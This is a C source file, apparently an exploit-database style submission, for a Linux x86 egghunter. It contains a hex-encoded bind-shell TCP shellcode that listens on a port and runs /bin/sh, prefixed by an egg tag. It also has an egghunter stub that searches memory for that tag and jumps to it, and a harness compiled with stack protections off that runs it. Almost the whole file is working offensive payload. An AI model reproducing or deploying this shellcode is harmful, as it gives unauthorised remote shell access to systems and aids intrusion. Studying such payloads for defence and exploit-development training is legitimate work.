/* 
 [+] Title     : Egghunter
 [+] Author    : Muhann4d
 [+] Arch      : Linux 86
 [+] Egg Tag is: configurable
 [+] To compile: gcc -fno-stack-protector -z execstack shellcode.c -o your_shell_name
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define EGG "\x90\x50\x90\x50"	/*  EGG */

unsigned char egghunter[];

void main()

{

/* Payload (Bind Shell TCP)*/
  unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\x89\xc3\x50\xb0\x66\x43\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x6a\x66\x58\x5b\x59\x66\x68"
"\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\x56"
"\x56\x52\xb0\x66\x43\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x89\xca\xcd\x80";

 printf("Shellcode: %d bytes\n", strlen(shellcode));



/* Egghunter */
 strcpy(egghunter,"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
EGG
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7");

 printf("Egghunter: %d bytes\n", strlen(egghunter));

 int (*ret)() = (int(*)())egghunter;

 ret();

}
